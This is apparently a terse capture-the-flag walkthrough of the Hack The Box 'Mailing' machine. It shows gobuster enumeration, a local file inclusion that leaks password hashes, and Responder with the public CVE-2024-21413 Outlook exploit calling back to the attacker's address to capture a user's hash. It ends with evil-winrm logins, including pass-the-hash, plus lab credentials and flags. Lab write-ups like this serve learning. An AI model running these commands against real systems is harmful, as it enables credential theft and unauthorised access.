![[Mailing image.png]]

![[Mailing image 1.png]]

![[Mailing image 2.png]]

gobuster dir -u http://mailing.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip

![[Mailing image 3.png]]

![[Mailing image 4.png]]

file=

LFI

![[Mailing image 5.png]]

![[Mailing image 6.png]]

File Location

![[Mailing image 7.png]]

![[Mailing image 8.png]]

![[Mailing image 9.png]]

AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7

![[Mailing image 10.png]]

homenetworkingadministrator

Password=0a9f8ad8bf896b501dde74f08efd7e4c

解析できず

Responder

responder -I tun0

![[Mailing image 11.png]]

PoC

https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

![[Mailing image 12.png]]

python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url 10.10.16.4 --subject test

![[Mailing image 13.png]]

maya:m4y4ngs4ri

![[Mailing image 14.png]]

evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri

![[Mailing image 15.png]]

0ba01b9ecfeacaebd88d0c76375ef48d

![[Mailing image 16.png]]

evil-winrm -i 10.10.11.14 -u localadmin -H 9aa582783780d1546d62f2d102daefae

![[Mailing image 17.png]]

![[Mailing image 18.png]]

8e4e02c9a3c3c261ca189ea94ea27ab3